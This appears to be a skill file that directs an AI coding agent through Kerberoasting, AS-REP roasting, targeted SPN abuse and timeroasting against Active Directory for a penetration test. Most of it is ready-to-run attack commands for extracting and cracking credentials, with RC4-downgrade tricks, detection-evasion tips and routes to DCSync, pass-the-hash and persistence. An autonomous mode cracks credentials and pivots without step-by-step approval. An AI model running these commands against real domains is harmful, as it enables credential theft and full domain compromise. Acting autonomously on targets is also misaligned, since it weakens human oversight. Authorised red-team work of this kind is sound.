---
name: kerberos-roasting
description: >
  Extracts and cracks Kerberos service tickets (Kerberoasting) and AS-REP
  hashes (AS-REP Roasting) for offline password recovery.
keywords:
  - kerberoast
  - asreproast
  - AS-REP
  - GetUserSPNs
  - service ticket
  - SPN cracking
  - roasting
  - GetNPUsers
  - pre-authentication disabled
  - targeting AD service accounts with SPNs or accounts with pre-auth disabled
tools:
  - Impacket (GetUserSPNs.py
  - GetNPUsers.py)
  - Rubeus
  - netexec
  - hashcat
  - john
  - targetedKerberoast.py
opsec: medium
---

# Kerberos Roasting

You are helping a penetration tester perform Kerberoasting (extracting TGS
tickets for offline cracking) and AS-REP Roasting (extracting AS-REP hashes
from accounts without pre-authentication). All testing is under explicit
written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present the command with a one-line explanation of what it does and
  why. Wait for explicit user approval before executing. Never batch multiple
  target-touching commands without approval — present them one at a time (or as
  a small logical group if they achieve a single objective, e.g., "enumerate SMB
  shares"). Local-only operations (file writes, output parsing, engagement
  logging, hash cracking) do not require approval. At decision forks, present
  options and let the user choose.
- **Autonomous**: Enumerate, extract, and crack. Report cracked credentials
  at milestones. Route to lateral movement automatically.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically.

When an engagement directory exists:
- **Activity** -> `### [YYYY-MM-DD HH:MM:SS] kerberos-roasting -> <domain>` with enumeration
  counts, extraction results, cracking outcomes.
- **Findings** -> Log cracked credentials as findings with severity based on
  account privilege level (DA service account = Critical, standard = Medium).
- **Evidence** -> Save hash files to `engagement/evidence/kerberoast-hashes.txt`,
  cracked results to `engagement/evidence/kerberoast-cracked.txt`.

### Invocation Log

Immediately on activation — before reading state.md or doing any assessment —
log invocation to both the screen and activity.md:

1. **On-screen**: Print `[kerberos-roasting] Activated → <target>` so the operator
   sees which skill is running.
2. **activity.md**: Append:
   ```
   ### [YYYY-MM-DD HH:MM:SS] kerberos-roasting → <target>
   - Invoked (assessment starting)
   ```

**Timestamps:** Replace `[YYYY-MM-DD HH:MM:SS]` with the actual current date
and time. Run `date '+%Y-%m-%d %H:%M:%S'` to get it. Never write the literal
placeholder `[YYYY-MM-DD HH:MM:SS]` — activity.md entries need real timestamps
with date and second precision for timeline reconstruction.

This entry must be written NOW, not deferred. Subsequent milestone entries
append bullet points under this same header.


## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Skip accounts already roasted (check Vulns/Blocked sections)
- Use existing credentials for authenticated enumeration
- Check if SPNs or AS-REP targets were already identified by **ad-discovery**

Write `engagement/state.md` at these checkpoints (not just at completion):
1. **After confirming a vulnerability** — add to Vulns with `[found]`
2. **After successful exploitation** — add credentials, access, pivot paths
3. **Before routing to another skill** — the next skill reads state.md on activation

At each checkpoint and on completion, update the relevant sections of
`engagement/state.md`:
- **Credentials**: Add cracked username:password pairs
- **Vulns**: `[found] Kerberoastable: svc_sql (SPN: MSSQLSvc/db01)` or `[done]` if cracked
- **Pivot Map**: Cracked creds -> what access they grant (local admin, DA, etc.)
- **Blocked**: Accounts that couldn't be cracked (note hash type and attempts)

## Prerequisites

- Any valid domain user credential (for standard Kerberoasting/AS-REP roasting)
- OR: a username with DONT_REQ_PREAUTH (for Kerberoasting without a domain account)
- OR: just a username list (for AS-REP roasting without authentication)
- Tools: Impacket, `hashcat` or `john`, optionally `netexec`, `Rubeus`, `bloodyAD`

**Kerberos-first authentication:**

```bash
# Get a TGT first
getTGT.py DOMAIN/user:'Password123'@DC.DOMAIN.LOCAL
# or with NTLM hash
getTGT.py DOMAIN/user@DC.DOMAIN.LOCAL -hashes :NTHASH

export KRB5CCNAME=user.ccache

# All Impacket roasting tools support -k -no-pass
GetUserSPNs.py DOMAIN/user@DC.DOMAIN.LOCAL -k -no-pass -request
GetNPUsers.py DOMAIN/user@DC.DOMAIN.LOCAL -k -no-pass
```

## Privileged Commands

Claude Code cannot execute `sudo` commands. The following require root and
must be handed off to the user:

- **timeroast.py** — NTP authentication hash extraction (needs raw sockets for UDP 123)
- **ntpdate / rdate** — clock synchronization (needed for Kerberos, requires root)

**Handoff protocol:** Present the full command including `sudo`, ask the user
to run it, then read the output file (`tee` captures timeroast output) or
confirm completion (ntpdate).

**Non-privileged commands** Claude can execute directly:
- All roasting tools: `GetUserSPNs.py`, `GetNPUsers.py`, `netexec`, `Rubeus`
- Targeted kerberoasting: `targetedKerberoast.py`, `bloodyAD`
- Cracking: `hashcat`, `john`

## Step 1: Assess

Determine what access level is available:

1. **Valid domain credentials** (password, hash, or TGT) -> proceed to Step 2
2. **Username with DONT_REQ_PREAUTH known** -> skip to Step 5 (AS-REP) or
   Step 6 (Kerberoasting without domain account)
3. **Username list only, no credentials** -> skip to Step 5 (AS-REP)
4. **Write access to user objects (GenericAll/GenericWrite)** -> Step 7 (Targeted)

## Step 2: Enumerate Kerberoastable Accounts

### Impacket (Linux)

```bash
# List all user accounts with SPNs (no ticket request yet)
GetUserSPNs.py DOMAIN/user:'Password123' -dc-ip DC_IP

# With Kerberos auth
GetUserSPNs.py DOMAIN/user@DC.DOMAIN.LOCAL -k -no-pass -dc-ip DC_IP
```

### NetExec

```bash
# Enumerate via LDAP and extract in one step
nxc ldap DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' \
  --kerberoasting kerberoast.txt

# With Kerberos auth
nxc ldap DC01.DOMAIN.LOCAL --use-kcache --kerberoasting kerberoast.txt
```

### Rubeus (Windows)

```powershell
# Statistics overview — encryption types, password age, admin status
.\Rubeus.exe kerberoast /stats

# List without requesting (enumeration only)
.\Rubeus.exe kerberoast /stats /nowrap
```

### Prioritize Targets

Before mass-roasting, prioritize by:
- **AdminCount=1** — service accounts in privileged groups
- **pwdLastSet age** — older passwords are weaker (years-old = likely crackable)
- **Encryption type** — RC4 (etype 23) cracks 1000x faster than AES (etype 17/18)
- **Blast radius** — BloodHound shortest path from SPN account to DA

## Step 3: Extract TGS Hashes (Kerberoasting)

### Impacket (Linux) — Preferred

```bash
# Request all SPN tickets
GetUserSPNs.py DOMAIN/user:'Password123' -dc-ip DC_IP \
  -request -outputfile hashes.kerberoast

# Target single user (reduces noise)
GetUserSPNs.py DOMAIN/user:'Password123' -dc-ip DC_IP \
  -request-user svc_mssql -outputfile hashes.kerberoast

# With NTLM hash
GetUserSPNs.py DOMAIN/user -dc-ip DC_IP \
  -hashes :NTHASH -request -outputfile hashes.kerberoast

# With Kerberos auth (most OPSEC-safe)
GetUserSPNs.py DOMAIN/user@DC.DOMAIN.LOCAL -k -no-pass \
  -request -outputfile hashes.kerberoast
```

### Rubeus (Windows)

```powershell
# All SPNs (noisy — avoid in mature environments)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

# Target single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast

# Admins only (smaller footprint)
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap

# RC4 downgrade via tgtdeleg trick (forces RC4 even on AES-enabled accounts)
.\Rubeus.exe kerberoast /tgtdeleg

# OPSEC-safer: only roast accounts that already lack AES support
.\Rubeus.exe kerberoast /rc4opsec

# Throttled extraction
.\Rubeus.exe kerberoast /user:svc_mssql /delay:2000 /jitter:30 /nowrap

# Scope to specific OU
.\Rubeus.exe kerberoast /ou:"OU=ServiceAccounts,DC=domain,DC=local" /nowrap

# Target old passwords (more likely weak)
.\Rubeus.exe kerberoast /pwdsetbefore:01-01-2022 /nowrap
```

### PowerView (Windows)

```powershell
# All user SPNs to hashcat format
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv kerberoast.csv -NoTypeInformation
```

## Step 4: Crack Offline

### Hash Formats

| Hash Prefix | Encryption | Hashcat Mode | John Format |
|-------------|-----------|--------------|-------------|
| `$krb5tgs$23$` | RC4 (etype 23) | `13100` | `krb5tgs` |
| `$krb5tgs$17$` | AES128 (etype 17) | `19600` | `krb5tgs` |
| `$krb5tgs$18$` | AES256 (etype 18) | `19700` | `krb5tgs` |

**Cracking speed: RC4 is ~1000x faster than AES.** Always prefer RC4 tickets.

### Hashcat

```bash
# RC4 (fast — billions/sec on modern GPU)
hashcat -m 13100 -a 0 hashes.kerberoast /usr/share/wordlists/rockyou.txt

# RC4 with rules
hashcat -m 13100 -a 0 hashes.kerberoast /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# AES128
hashcat -m 19600 -a 0 hashes.kerberoast /usr/share/wordlists/rockyou.txt

# AES256
hashcat -m 19700 -a 0 hashes.kerberoast /usr/share/wordlists/rockyou.txt
```

### John the Ripper

```bash
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerberoast
```

### After Cracking

With recovered service account credentials:
1. Check what the account has access to (BloodHound, nxc)
2. Test for local admin: `nxc smb TARGETS -u svc_user -p 'CrackedPass' -d DOMAIN`
3. Look for (Pwn3d!) — local admin on servers
4. Route to **pass-the-hash** for lateral movement or **credential-dumping** if admin

## Step 5: AS-REP Roasting

Targets accounts with `DONT_REQ_PREAUTH` flag. No valid credentials needed
to request the hash — only need to know the username.

### Enumerate AS-REP Roastable Accounts

```bash
# With credentials — auto-enumerate via LDAP
GetNPUsers.py DOMAIN/user:'Password123' -dc-ip DC_IP

# With Kerberos auth
GetNPUsers.py DOMAIN/user@DC.DOMAIN.LOCAL -k -no-pass -dc-ip DC_IP

# NetExec
nxc ldap DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' \
  --asreproast asrep-hashes.txt

# bloodyAD — direct LDAP filter
bloodyAD -u user -p 'Password123' -d DOMAIN.LOCAL --host DC_IP \
  get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' \
  --attr sAMAccountName

# PowerView (Windows)
Get-DomainUser -PreauthNotRequired -Verbose
```

### Extract AS-REP Hashes

```bash
# Without credentials — spray a username list
GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat \
  -outputfile asrep-hashes.txt -dc-ip DC_IP

# Single known user (no password needed)
GetNPUsers.py DOMAIN/targetuser -no-pass -dc-ip DC_IP

# Rubeus (Windows)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep-hashes.txt
.\Rubeus.exe asreproast /user:targetuser /format:hashcat /outfile:asrep-hashes.txt
```

### Crack AS-REP Hashes

| Hash Prefix | Hashcat Mode | John Format |
|-------------|--------------|-------------|
| `$krb5asrep$23$` | `18200` | `krb5asrep` |

```bash
hashcat -m 18200 -a 0 asrep-hashes.txt /usr/share/wordlists/rockyou.txt
john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep-hashes.txt
```

## Step 6: Kerberoasting Without a Domain Account

If you have a username with DONT_REQ_PREAUTH but no valid domain password,
you can request service tickets by altering the `sname` field in the AS-REQ.

```bash
# Impacket (PR #1413) — provide no-preauth user and target list
GetUserSPNs.py -no-preauth "NOPREAUTH_USER" -usersfile users.txt \
  -dc-host DC01.DOMAIN.LOCAL DOMAIN.LOCAL/

# NetExec
nxc ldap DC01.DOMAIN.LOCAL -u '' -p '' \
  --no-preauth-targets users.txt --kerberoasting output.txt

# Rubeus
.\Rubeus.exe kerberoast /nopreauth:NOPREAUTH_USER /spn:TARGET_SPN \
  /domain:DOMAIN.LOCAL /dc:DC01.DOMAIN.LOCAL /outfile:hashes.txt
```

**Limitation**: Cannot enumerate SPNs via LDAP without credentials. Must
provide a user list to test against.

## Step 7: Targeted Kerberoasting (ACL Abuse)

When you have GenericWrite or GenericAll on a user account, you can
temporarily set an SPN to make it Kerberoastable.

### Automated (Linux)

```bash
# targetedKerberoast.py — adds SPN, requests TGS (RC4), removes SPN
targetedKerberoast.py -d DOMAIN.LOCAL -u attacker -p 'Password123' \
  --request-user target_admin

# With Kerberos auth
targetedKerberoast.py -d DOMAIN.LOCAL -u attacker -k --no-pass \
  --request-user target_admin
```

### Manual (Windows)

```powershell
# 1. Add temporary SPN
Set-DomainObject -Identity target_admin -Set @{serviceprincipalname='fake/TempSvc'} -Verbose

# 2. Roast
.\Rubeus.exe kerberoast /user:target_admin /nowrap

# 3. Clean up immediately
Set-DomainObject -Identity target_admin -Clear serviceprincipalname -Verbose
```

### OPSEC Warning

- Adding/removing SPNs generates **Event IDs 5136 and 4738** (directory
  service object modified and user account changed)
- Keep the SPN window as short as possible
- Use `targetedKerberoast.py` which automates cleanup

## Step 8: Timeroasting

Exploits Windows NTP authentication to extract hashes for computer accounts.
**Completely unauthenticated** — only needs network access to DC on UDP 123.

```bash
# Request NTP hashes for all computer accounts
sudo timeroast.py DC_IP | tee ntp-hashes.txt

# Crack
hashcat -m 31300 ntp-hashes.txt /usr/share/wordlists/rockyou.txt
```

| Hash Type | Hashcat Mode |
|-----------|--------------|
| NTP (timeroast) | `31300` |

**Practical value is limited**: Computer account passwords are typically 120+
random characters. Most useful against **trust accounts** between domains,
which may have weaker passwords.

## Step 9: Escalate or Pivot

**Before routing**: Write `engagement/state.md` and append to
`engagement/activity.md` with results so far. The next skill reads state.md
on activation — stale state means duplicate work or missed context.

After cracking credentials:
- **Service account is DA or has DCSync rights**: Route to **credential-dumping**
  (DCSync) for full domain compromise
- **Service account has local admin on servers**: Route to **pass-the-hash** for
  lateral movement, then **credential-dumping** for LSASS/SAM
- **Service account has delegation**: Route to **kerberos-delegation** for
  impersonation attacks
- **Service account has ADCS enrollment**: Route to **adcs-template-abuse**
- **Service account has dangerous ACLs**: Route to **acl-abuse**
- **No credentials cracked**: Try larger wordlists, rules, or route to
  **password-spraying** for a different approach
- **Need persistence on cracked account**: Route to **ad-persistence** or set
  SPN for re-roasting later

When routing, pass: cracked username/password, domain, DC hostname, and mode.

## Stall Detection

If you have spent **5 or more tool-calling rounds** on the same failure with
no meaningful progress — same error, no new information, no change in output
— **stop**.

**What counts as progress:**
- Trying a variant or alternative **documented in this skill**
- Adjusting syntax, flags, or parameters per the Troubleshooting section
- Gaining new diagnostic information (different error, partial success)

**What does NOT count as progress:**
- Writing custom exploit code not provided in this skill
- Inventing workarounds using techniques from other domains
- Retrying the same command with trivially different input
- Compiling or transferring tools not mentioned in this skill

If you find yourself writing code that isn't in this skill, you have left
methodology. That is a stall.

Do not loop. Work through failures systematically:
1. Try each variant or alternative **once**
2. Check the Troubleshooting section for known fixes
3. If nothing works after 5 rounds, you are stalled

**When stalled, return to the orchestrator immediately with:**
- What was attempted (commands, variants, alternatives tried)
- What failed and why (error messages, empty responses, timeouts)
- Assessment: **blocked** (permanent — config, patched, missing prereq) or
  **retry-later** (may work with different context, creds, or access)
- Update `engagement/state.md` Blocked section before returning

**Mode behavior:**
- **Guided**: Tell the user you're stalled, present what was tried, and
  recommend the next best path.
- **Autonomous**: Update state.md Blocked section, return findings to the
  orchestrator. Do not retry the same technique — the orchestrator will
  decide whether to revisit with new context or route elsewhere.

## Troubleshooting

### KRB_AP_ERR_SKEW (Clock Skew)

Kerberos requires clocks within 5 minutes of the DC. This is a **Clock Skew
Interrupt** — stop immediately and return to the orchestrator. Do not retry or
fall back to NTLM. The fix requires root:
```bash
sudo ntpdate DC_IP
# or
sudo rdate -n DC_IP
```

### No SPN Accounts Found

- Computer accounts have SPNs but are not useful for Kerberoasting (passwords
  are 120+ char random). Only **user** accounts with SPNs are targets.
- Check if SPNs are set on group managed service accounts (gMSA) — these also
  have strong passwords and are not crackable.

### RC4 Disabled Domain-Wide

If only AES tickets are available:
- Cracking is ~1000x slower but still feasible with good wordlists and rules
- Use hashcat modes `19600` (AES128) or `19700` (AES256)
- Consider the `/tgtdeleg` trick in Rubeus which may still force RC4

### Hash Format Issues

- Impacket outputs hashcat format by default
- Rubeus outputs hashcat format with `/format:hashcat`
- To convert `.kirbi` files: `kirbi2john.py ticket.kirbi > hash.john`
- Convert John to hashcat: `sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*\$\2/' hash.john`

### OPSEC Considerations

| Action | Detection | Event ID |
|--------|-----------|----------|
| TGS request (Kerberoast) | Kerberos service ticket requested | 4769 |
| AS-REP request | TGT requested with no pre-auth | 4768 (preauth type 0) |
| RC4 ticket request | Anomalous in AES-hardened domain | 4769 (etype 0x17) |
| SPN added/removed (targeted) | Directory object modified | 5136, 4738 |
| Mass TGS requests | High volume 4769 from single source | SIEM correlation |
